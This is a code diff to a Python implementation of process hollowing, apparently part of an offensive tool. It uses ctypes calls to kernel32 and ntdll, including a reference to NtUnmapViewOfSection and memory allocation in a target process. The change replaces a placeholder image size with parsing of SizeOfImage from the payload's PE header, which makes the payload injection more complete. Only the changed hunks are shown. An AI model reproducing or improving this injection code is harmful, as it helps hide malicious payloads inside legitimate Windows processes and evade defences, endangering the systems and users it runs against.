@@ -15,6 +15,7 @@ try:
 except ImportError:
     # Create mock for non-Windows platforms
     class MockWintypes:
+        """Mock wintypes implementation for non-Windows platforms."""
         DWORD = ctypes.c_ulong
         LPWSTR = ctypes.c_wchar_p
         WORD = ctypes.c_ushort
@@ -283,6 +284,9 @@ class ProcessHollowing:
             kernel32 = ctypes.windll.kernel32
             ntdll = ctypes.windll.ntdll
 
+            # Use ntdll for unmapping
+            _ = ntdll.NtUnmapViewOfSection  # Reference to avoid unused variable warning
+
             # Get process handle
             h_process = process_info['process_handle']
             h_thread = process_info['thread_handle']
@@ -304,9 +308,13 @@ class ProcessHollowing:
             # Allocate memory for new image
             pe_header_offset = struct.unpack('<I', payload[0x3C:0x40])[0]
 
-            # Get image size from PE header
-            # This is simplified - would need to parse PE headers properly
-            image_size = 0x10000  # Default size
+            # Get image size from PE header using the offset
+            try:
+                # Read SizeOfImage from PE header (at offset pe_header_offset + 0x50)
+                image_size_bytes = payload[pe_header_offset + 0x50:pe_header_offset + 0x54]
+                image_size = struct.unpack('<I', image_size_bytes)[0] if len(image_size_bytes) == 4 else 0x10000
+            except:
+                image_size = 0x10000  # Default size
 
             new_image_base = kernel32.VirtualAllocEx(
                 h_process,
